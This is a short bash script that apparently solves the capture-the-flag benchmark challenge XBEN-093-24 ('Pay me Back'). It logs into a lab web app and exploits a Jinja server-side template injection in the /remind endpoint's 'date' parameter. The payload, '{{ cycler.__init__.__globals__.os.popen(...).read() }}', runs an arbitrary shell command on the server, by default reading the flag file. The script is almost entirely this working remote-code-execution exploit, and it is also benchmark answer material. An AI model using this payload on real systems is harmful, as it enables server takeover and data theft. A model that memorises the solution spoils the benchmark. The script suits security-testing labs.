#!/usr/bin/env bash
# XBEN-093-24 — "Pay me Back" (tags: ssti)
#
# `/remind` formats the `date` parameter into a message with `str.format`, and
# then renders that message as a Jinja template. Passing the same value as a
# template *variable* alongside it does not help: the copy that was pasted into
# the template source is already template source.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben093-$$"
COMMAND="${2:-cat flag.txt}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/login" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/login' \
    --set 'form.username=user' --set 'form.password=user' \
    --session "$SESSION" >/dev/null
seq="$("$H5I" websec replay req_0 --create --set 'path=/remind' \
    --set "query.date={{ cycler.__init__.__globals__.os.popen(\"$COMMAND\").read() }}" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
